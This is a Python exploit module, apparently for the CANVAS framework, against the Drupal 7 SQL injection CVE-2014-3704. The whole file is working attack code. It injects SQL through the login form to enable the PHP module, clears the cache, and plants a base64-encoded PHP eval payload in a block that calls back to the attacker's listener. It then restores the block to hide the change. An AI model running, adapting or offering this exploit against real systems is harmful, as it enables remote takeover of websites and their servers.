#!/usr/bin/env python

import sys
import os
import time
import re
import urllib
import hashlib
import time
import random

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from libs.canvasos import *
from ExploitTypes.php_multi import *

NAME                           = 'Drupal injection exploit'
DESCRIPTION                    = ("This exploit leverages a vulnerability in Drupal's database abstraction api that allows an " +
                                  "attacker to send specially crafted requests resulting in arbitrary SQL execution.")
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'drupal.org'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2014-3704'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704'

VERSION                        = '0.1'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Web Exploits'
PROPERTY['SITE']               = 'Remote'
PROPERTY['ARCH']               = [["Linux" ] , ["Windows"]]
PROPERTY['VERSION']            = ["7.x < 7.32"]
DOCUMENTATION["References"]    = "https://www.drupal.org/SA-CORE-2014-005"

DOCUMENTATION['Notes']         = """

This exploit tries to open a php callback to canvas by injecting php code
in Drupal's login block through the database sql injection.
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port               = 80
        self.host               = ""
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = ""
        self.basepaths          = []
        #self.command           = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.foundstrings       = ["Drupal"]
        self.testfile           = "index.php"

        self.payload            = ""

        self.form_build_id      = None

        self.php_template       = """<?php
            $match = FALSE;
            if (in_array(\"BASEPATH/?q=launch-callback\", $_SERVER, true) ) %s;
            if (in_array(\"BASEPATH/?q=launch-callback\", $_SERVER, true) ) $match = TRUE;
            return $match;
        ?>"""


        self.php_template       = self.php_template.replace("\n","")

    def getargs(self):
        """
        Get arguments for attack.
        """
        php_multi.getargs(self)

        self.getarg("host")
        self.getarg("port")
        self.getarg("basepath")
        self.getarg("basicauth_user")
        self.getarg("basicauth_password")
        self.getarg("ssl")

        self.hostname  = self.argsDict.get('vhost')
        self.basepath  = self.basepath.strip()
        self.basepaths = [self.basepath]

        self.php_template = self.php_template.replace("BASEPATH", self.basepath.rstrip("/"))


    def get_form_build_id(self, data):
        matches = re.findall("form_build_id\"\s+value=\"([^\"]+)\"",data)
        if len(matches):
            return matches[0]
        else:
            return None

    def trigger_sqli(self, payload):
        post_data = ("name[user;%s]=user" % urllib.quote_plus(payload, safe="';,/$"),
                     "name[user]=user",
                     "pass=pass",
                     "form_build_id=%s" % self.form_build_id,
                     "form_id=user_login_block",
                     urllib.quote_plus("op=Log in", safe="=")
                    )

        data = self.UA.POST("?q=node&destination=node", data="&".join(post_data) )

        return data

    def trigger_callback(self):
        data = self.UA.GET("?q=launch-callback")
        return data

    def request_build_id(self):
        self.log("[+] Requesting form data")
        data = self.UA.GET("")

        self.form_build_id = self.get_form_build_id(data)
        if not self.form_build_id:
            self.log("[EE] New form_build_id not found")
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

        return 1


    def request1(self):
        # Enable module
        if not self.request_build_id():
            return False

        self.log("[+] Enabling module")
        payload = "UPDATE system SET status='1' WHERE name='php';--"
        self.trigger_sqli(payload)
        return True

    def request2(self):
        if not self.request_build_id():
            return False

        # Update cache
        self.log("[+] Updating cache")
        payload = "DELETE FROM cache_bootstrap WHERE cid='system_list';--"
        self.trigger_sqli(payload)

        time.sleep(5)
        return True

    def request3(self):
        if not self.request_build_id():
            return False

        # Alter block
        self.log("[+] Injecting block")
        command = self.get_php_to_mosdef()
        command = b64encode(command)
        command = "eval(base64_decode(\"%s\"))" % command

        php_payload = self.php_template % command
        payload = "UPDATE block SET visibility='2',pages='%s' WHERE delta='main' and region='content';--" % php_payload
        self.trigger_sqli(payload)
        return True

    def request4(self):
        # Launch callback
        self.log("[+] Deploying the callback")
        self.trigger_callback()

        time.sleep(2)
        return True


    def request5(self):
        if not self.request_build_id():
            return False

        # Restore block
        self.log("[+] Restoring block")
        payload = "UPDATE block SET visibility='0',pages='' WHERE delta='main' and region='content';--"
        self.trigger_sqli(payload)

        return True


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
